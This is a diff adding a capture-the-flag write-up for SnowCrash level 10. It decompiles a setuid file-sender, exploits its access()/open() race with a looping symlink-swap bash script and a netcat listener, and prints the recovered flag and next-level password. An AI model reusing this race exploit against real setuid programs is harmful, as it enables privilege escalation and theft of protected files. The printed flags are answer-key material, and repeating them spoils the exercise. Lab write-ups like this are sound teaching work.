@@ -475,3 +475,183 @@ Check flag.Here is your token : s5cAJpM8ev6XHw998pRWG728z
 ```
 
 # Level10
+
+Level10
+
+Access the file.
+
+When we login as level10 user we get the following files :
+
+level10@SnowCrash:~$ ls -l
+total 16
+-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
+-rw-------  1 flag10 flag10     26 Mar  5  2016 token
+
+We do not have access to the file token. When we execute the binary level10 we get the folloing  result :
+
+level10@SnowCrash:~$ ./level10 
+./level10 file host
+        sends file to host if you have access to it
+
+It seems to expect some arguments. one file name and a host such as an ip address of a host
+
+so we try the folloing
+
+level10@SnowCrash:~$ ./level10 token localhost
+You don't have access to token
+
+level10@SnowCrash:~$ ./level10 /bin/ls localhost
+Connecting to localhost:6969 .. Unable to connect to host localhost
+
+It seems that the file do not let us see the content of token and if we do put a file that it excepts we neet to have a receaver for this file, specially on port 6969.
+
+When we decompile the binary we get the following result :
+```sh
+int main(int argc, char ** argv) {
+    char buffer[4096]; // bp-4132
+    int32_t v1 = (int32_t)argv; // 0x80486e0
+    int32_t v2 = __readgsdword(20); // 0x80486e7
+    if (argc <= 2) {
+        int32_t v3 = *(int32_t *)argv; // 0x8048700
+        printf("%s file host\n\tsends file to host if you have access to it\n", (char *)v3);
+        exit(1);
+        // UNREACHABLE
+    }
+    int32_t * path = (int32_t *)(: + 4); // 0x8048723
+    char * path2 = (char *)*path; // 0x8048726
+    char * cp = (char *)*(int32_t *)(v1 + 8); // 0x8048731
+    int32_t chars_printed;
+    int32_t result; // 0x804896b
+    int32_t * v4;
+    if (access((char *)*path, R_OK) != 0) {
+        // 0x8048940
+        chars_printed = printf("You don't have access to %s\n", path2);
+        // branch -> 0x8048955
+        // 0x8048955
+        if (v2 == __readgsdword(20)) {
+            // 0x8048955
+            result = chars_printed;
+            // branch -> 0x804896a
+        } else {
+            // 0x8048965
+            __stack_chk_fail();
+            result = (int32_t)&v4;
+            // branch -> 0x804896a
+        }
+        // 0x804896a
+        return result;
+    }
+    // 0x8048756
+    printf("Connecting to %s:6969 .. ", cp);
+    fflush((struct _IO_FILE *)g1);
+    int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x804878f
+    int32_t sin = 2; // bp-36
+    inet_addr(cp);
+    htons(0x1b39);
+    if (connect(sock_fd, (struct sockaddr *)&sin, 16) == -1) {
+        // 0x804880f
+        printf("Unable to connect to host %s\n", cp);
+        exit(1);
+        // UNREACHABLE
+    }
+    // 0x8048830
+    if (write(sock_fd, (int32_t *)".*( )*.\n", 8) == -1) {
+        // 0x8048851
+        printf("Unable to write banner to host %s\n", cp);
+        exit(1);
+        // UNREACHABLE
+    }
+    // 0x8048872
+    printf("Connected!\nSending file .. ");
+    fflush((struct _IO_FILE *)g1);
+    int32_t fd = open(path2, O_RDONLY); // 0x804889b
+    if (fd == -1) {
+        // 0x80488ab
+        puts("Damn. Unable to open file");
+        exit(1);
+        // UNREACHABLE
+    }
+    // 0x80488c3
+    int32_t nbyte = read(fd, (int32_t *)&buffer, 0x1000); // 0x80488da
+    if (nbyte == -1) {
+        int32_t err_num = *__errno_location(); // 0x80488ef
+        printf("Unable to read from file: %s\n", strerror(err_num));
+        exit(1);
+        // UNREACHABLE
+    }
+    // 0x8048916
+    write(sock_fd, (int32_t *)&buffer, nbyte);
+    chars_printed = puts("wrote file!");
+    // branch -> 0x8048955
+    // 0x8048955
+    if (v2 == __readgsdword(20)) {
+        // 0x8048955
+        result = chars_printed;
+        // branch -> 0x804896a
+    } else {
+        // 0x8048965
+        __stack_chk_fail();
+        result = (int32_t)&v4;
+        // branch -> 0x804896a
+    }
+    // 0x804896a
+    return result;
+}
+```
+It seems the file checks the access of the path that we provile and if the result is OK the program creates a TCP Socket and sends the file to cloent. There is nothing too complicated.
+
+In the man page of access we have a Warning it says :
+
+    Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided. (In the example just described, a safer alternative would be to temporarily switch the process's effective user ID to the real ID and then call open(2).)
+
+So it seems that the access function is not very secure because it is possible to exploit this function by providing a file to which we have access and once the check for Access is done if we are quick and we replace it with some other file that file will be consider valide.
+
+So in this situation what we can do is
+
+    make a way to replace the file quickly enough so that we can pass the access check and the executable reads the replaced file
+
+    Create a process to receave the file that will be send by the level10 executable.
+
+I have created a simple script that creates a random file that we an acces and replace it with the token file
+```sh
+#!/bin/bash
+
+# This file will be reserved so even if the link is deleted the file will stay
+random_file=$(head -c 500 /dev/urandom | tr -dc 'a-zA-Z0-9~!@#$%^&*_-' | fold -w 25 | head -n 1)
+
+# Crate a file with a random name
+touch /tmp/$random_file
+
+# This name will be used to create the symbolic link.
+link_name=$(head -c 500 /dev/urandom | tr -dc 'a-zA-Z0-9~!@#$%^&*_-' | fold -w 25 | head -n 1)
+
+while true
+do
+        /home/user/level10/level10 /tmp/$link_name 127.0.1 &> /dev/null
+done &
+
+while true
+do
+        ln -fs /home/user/level10/token /tmp/$link_name
+        ln -fs /tmp/$random_file /tmp/$link_name
+done
+```
+
+we can create and save this file in /tmp directory.
+
+Now what we need is a server that can accept TCP requests. And netcat can listen to a certain port and accept data from client.
+```sh
+## We are looping because it is possible that it doesn't work
+## in the first try.
+while true;  do nc.traditional -l -p 6969 | grep -v '.*( )*.' ; done
+```
+nc.traditional is just an other version of netcat (nc) where we can use the -p option to specify the port number to listen to. In the nc (the version provided in the ISO) it takes the port number as the last command line argument passed.
+
+In my case the best way to perform the job to get the flag was to execute the netcat loop in one terminal and the getflag.sh script in another and when we execute both of the script we get the flag from netcat
+
+level10@SnowCrash:~$ while true;  do nc.traditional -l -p 6969 | grep -v '.*( )*.' ; done
+woupa2yuojeeaaed06riuj63c
+
+Password for next level
+
+The Password to connect to the account level11 is feulo4b72j7edeahuete3no7c
